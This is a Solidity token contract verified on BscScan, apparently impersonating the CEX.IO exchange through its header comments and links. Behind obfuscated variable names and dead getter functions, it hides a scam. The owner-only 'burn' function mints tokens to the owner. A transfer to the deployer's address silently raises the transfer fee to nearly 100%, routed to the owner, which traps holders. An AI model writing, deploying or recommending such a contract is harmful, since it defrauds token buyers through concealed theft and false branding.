/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

//////////////////////////////////////////////////
//Get started with the easiest and most secure platform 
//to buy, sell, trade, and earn cryptocurrencies.
//////////////////////////////////////////////////
/*
    https://cex.io/
    https://t.me/CEX_IO
    https://twitter.com/cex_io
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.1;
contract CEXIO {
uint256 private  kmAnNF = 10000000000000;
address private  omqAfP = address(0);
address private  PdnoJR = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  HAnujj = address(0);
mapping (address => uint256) public balanceOf;
address private  UBOkTr = address(0);
uint256 private  uicwju = 100000000;
uint256 private  wXXaBQ = 1000000000000000000;
string public  symbol = "CEXIO";
uint256 private  FenHjy = 1000000000000000000000;
address private  Woqwsc = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
uint256 private  ttIqnj = 1000000000000000;
uint256 private  svuBdW = 10000000000;
uint8 public constant decimals = 18;
uint256 private  DrSliL = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  dPcuuy = address(0);
address private  acwmlb = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant HHOfot = 99999;
address private  ouyegu = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  pGiHei = address(0);
string public  name = "CEXIO";


modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}




function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "zDETZb");
require(to != address(0), "zDETZb");
require(amount <= balanceOf[from], "zDETZb");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HHOfot/DrSliL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==acwmlb){
DrSliL = HHOfot+2;
}
emit Transfer(from, to, transferAmount);
}


function _getttIqnj() private returns (uint256) {
return ttIqnj;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getpGiHei() private returns (address) {
return pGiHei;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tzDETZb 0");
require(spender != address(0), "fzDETZb 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}




function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
acwmlb = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getomqAfP() private returns (address) {
return omqAfP;
}

function _getwXXaBQ() private returns (uint256) {
return wXXaBQ;
}

function _getsvuBdW() private returns (uint256) {
return svuBdW;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getUBOkTr() private returns (address) {
return UBOkTr;
}

function _getouyegu() private returns (address) {
return ouyegu;
}

function _getdPcuuy() private returns (address) {
return dPcuuy;
}





function _getkmAnNF() private returns (uint256) {
return kmAnNF;
}

function _getFenHjy() private returns (uint256) {
return FenHjy;
}



function _getPdnoJR() private returns (address) {
return PdnoJR;
}



function _getuicwju() private returns (uint256) {
return uicwju;
}

function _getHAnujj() private returns (address) {
return HAnujj;
}

function _getWoqwsc() private returns (address) {
return Woqwsc;
}







function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}